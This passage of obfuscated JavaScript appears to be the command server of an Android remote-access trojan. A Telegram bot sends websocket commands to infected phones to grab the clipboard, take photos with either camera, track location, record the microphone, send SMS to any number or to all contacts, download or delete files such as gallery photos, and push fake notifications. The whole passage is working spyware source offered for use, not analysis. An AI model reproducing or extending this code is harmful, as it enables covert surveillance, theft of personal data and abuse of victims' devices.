      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'device_info' &&
    (appSocket.clients.forEach(function _0x4bce6e(_0x55b120) {
      _0x55b120.uuid == _0x39894d && _0x55b120.send('device_info')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'clipboard' &&
    (appSocket.clients.forEach(function _0x2558c0(_0x4c04aa) {
      _0x4c04aa.uuid == _0x39894d && _0x4c04aa.send('clipboard')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'camera_main' &&
    (appSocket.clients.forEach(function _0x10cf13(_0x4a91bc) {
      _0x4a91bc.uuid == _0x39894d && _0x4a91bc.send('camera_main')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'camera_selfie' &&
    (appSocket.clients.forEach(function _0x152118(_0x6dad04) {
      _0x6dad04.uuid == _0x39894d && _0x6dad04.send('camera_selfie')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'location' &&
    (appSocket.clients.forEach(function _0x43033a(_0x4cd64d) {
      _0x4cd64d.uuid == _0x39894d && _0x4cd64d.send('location')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'vibrate' &&
    (appSocket.clients.forEach(function _0x590c81(_0x275379) {
      _0x275379.uuid == _0x39894d && _0x275379.send('vibrate')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'stop_audio' &&
    (appSocket.clients.forEach(function _0x12edbf(_0xac5b8c) {
      _0xac5b8c.uuid == _0x39894d && _0xac5b8c.send('stop_audio')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'send_message' &&
    (appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE64 \uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE4E\uD835\uDE48\uD835\uDE4E\n\n\u2022ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
      { reply_markup: { force_reply: true } }
    ),
    (currentUuid = _0x39894d))
  _0x2f3f8b == 'send_message_to_all' &&
    (appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68\n\n\u2022 ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
      { reply_markup: { force_reply: true } }
    ),
    (currentUuid = _0x39894d))
  _0x2f3f8b == 'file' &&
    (appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\n\n\u2022 ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
      {
        reply_markup: { force_reply: true },
        parse_mode: 'HTML',
      }
    ),
    (currentUuid = _0x39894d))
  _0x2f3f8b == 'delete_file' &&
    (appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A\n\n\u2022 ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
      {
        reply_markup: { force_reply: true },
        parse_mode: 'HTML',
      }
    ),
    (currentUuid = _0x39894d))
  _0x2f3f8b == 'microphone' &&
    (appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59\n\n\u2022 ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
      {
        reply_markup: { force_reply: true },
        parse_mode: 'HTML',
      }
    ),
    (currentUuid = _0x39894d))
  _0x2f3f8b == 'toast' &&
    (appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE64\uD835\uDE63 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\n\n\u2022 ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
      {
        reply_markup: { force_reply: true },
        parse_mode: 'HTML',
      }
    ),
    (currentUuid = _0x39894d))
  _0x2f3f8b == 'show_notification' &&
    (appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\n\n\u2022 ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
      {
        reply_markup: { force_reply: true },
        parse_mode: 'HTML',
      }
    ),
    (currentUuid = _0x39894d))
  _0x2f3f8b == 'play_audio' &&
    (appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64 \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E\n\n\u2022 ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
      {
        reply_markup: { force_reply: true },
        parse_mode: 'HTML',
      }
    ),
    (currentUuid = _0x39894d))
})

setInterval(function () {
  appSocket.clients.forEach(function _0x3b936c(_0x41c8f7) {
    _0x41c8f7.send('ping')
  })
  try {
    axios.get(address).then((_0x48f637) => '')
  } catch (_0x1c37e3) {}
}, 5000)
appServer.listen(process.env.PORT || 8999)
